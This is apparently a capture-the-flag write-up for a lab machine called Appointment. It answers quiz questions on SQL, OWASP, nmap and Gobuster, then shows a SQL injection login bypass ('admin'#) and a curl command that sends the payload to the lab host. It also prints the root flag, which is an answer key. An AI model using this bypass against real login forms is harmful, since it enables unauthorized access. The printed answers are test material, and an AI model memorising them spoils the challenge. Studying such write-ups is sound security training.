# Appointment

## Task 1

> What does the acronym SQL stand for?

structured query language

## Task 2

> What is one of the most common type of SQL vulnerabilities?

sql injection

## Task 3

> What does PII stand for?

personally identifiable information

## Task 4

> What does the OWASP Top 10 list name the classification for this vulnerability?

A03:2021-Injection

The latest OWASP report lists the top 10 vulnerabilities as the following:

 1. Injection
 2. Broken authentication
 3. Sensitive data exposure
 4. XML external entities (XXE)
 5. Broken access control
 6. Security misconfigurations
 7. Cross-site scripting (XSS)
 8. Insecure deserialization
 9. Using components with known vulnerabilities
10. Insufficient logging and monitoring

* OWASP Top Ten \| OWASP Foundation  
  https://owasp.org/www-project-top-ten/

* What Is OWASP? What Is the OWASP Top 10? \| Fortinet  
  https://www.fortinet.com/resources/cyberglossary/owasp

## Task 5

> What service and version are running on port 80 of the target?

Apache httpd 2.4.38 ((Debian))

```
nmap -sV -p80 10.129.201.180
```

```out
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-13 22:03 EDT
Nmap scan report for 10.129.201.180
Host is up (0.029s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.78 seconds
```

## Task 6

> What is the standard port used for the HTTPS protocol?

443

```
grep https /etc/services
```

```out
# Updated from https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml .
https		443/tcp				# http protocol over TLS/SSL
https		443/udp				# HTTP/3
```

## Task 7

> What is one luck-based method of exploiting login pages?

brute-forcing

## Task 8

> What is a folder called in web-application terminology?

directory

Yeah, this *is* the name (not fucking "folder").

## Task 9

> What response code is given for "Not Found" errors?

404

Mr. Robot fans know this.

## Task 10

> What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?

dir

## Task 11

> What symbol do we use to comment out parts of the code?

\# (octothorpe)

## Task 12

> Submit root flag

e3d0796d002a446c0e622226f42e9672

```
select * from users where uname == '+$user+' && password == '+$pass+'\''
```

becomes

```
select * from users where uname == 'admin'#' && password == '+$pass+'\''
```

By the way, the proper way to write that would be something like this:

```
do('select * from users where username == ? && password == ?',
    "$user", "$pass")
```

This one took me a while because I had forgotten SQL from my earlier
days and was using a double quote instead of single. I also had to
visualize the SQL I was hypothetically generating in order to see how
the injection would possibly be working.

Can also automate with `curl`:

```
curl -sSL -X POST  -H "Content-Type: application/x-www-form-urlencoded"
-d 'username=admin%27%23&password=whatever' 'http://10.129.230.234/#' | grep flag
```

```out
┌──(kali㉿kali)-[~]
└─$ curl -sSL -X POST  -H "Content-Type: application/x-www-form-urlencoded" -d       'username=admin%27%23&password=whatever' 'http://10.129.230.234/#' |grep flag<div><h3>Congratulations!</h3><br><h4>Your flag is: e3d0796d002a446c0e622226f42e9672</h4></div></div></div></body></html>
```

